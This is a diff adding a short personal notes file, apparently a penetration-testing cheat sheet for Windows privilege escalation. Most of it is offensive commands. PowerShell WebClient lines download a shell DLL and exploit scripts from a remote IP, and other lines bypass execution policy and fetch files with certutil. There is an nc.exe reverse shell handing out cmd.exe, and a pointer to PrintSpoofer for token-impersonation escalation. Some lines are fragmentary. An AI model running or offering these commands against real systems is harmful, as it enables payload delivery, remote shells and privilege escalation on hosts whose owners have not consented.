@@ -1,0 +1,28 @@
+PowerShell
+
+C:\Windows\System32\WindowsPowerShell\v1.0>
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.49.249/shell3.dll" , "c:\Users\tony\Downloads\shell3.dll")
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.49.249/exploit.ps1" , "c:\Users\tony\Downloads\exploit.ps1")
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.49.249/exploit2.ps1" , "c:\Users\tony\Downloads\exploit2.ps1")
+
+powershell.exe -ep bypass
+powershell.exe -exec bypass
+
+certutil -urlcache -f -split http file?
+whoami.exe /pri
+whoami.exe /all
+Go to
+c:\windows\system32\   allbinarieshere
+C:\Windows\System32\WindowsPowerShell\v1.0
+---------------------------------------------------------
+nc.exe -nv <target IP> <target PORT> -e cmd.exe
+----------------------------------------------------------------------
+EscalaTion Impersonate
+whoami.exe /priv
+https://github.com/itm4n/PrintSpoofer similar potato
+
+Remember \\ windows escape
+
+----------------------------------------------------------------------
+Ports
+sudo kill -9 `sudo lsof -t -i:3002`
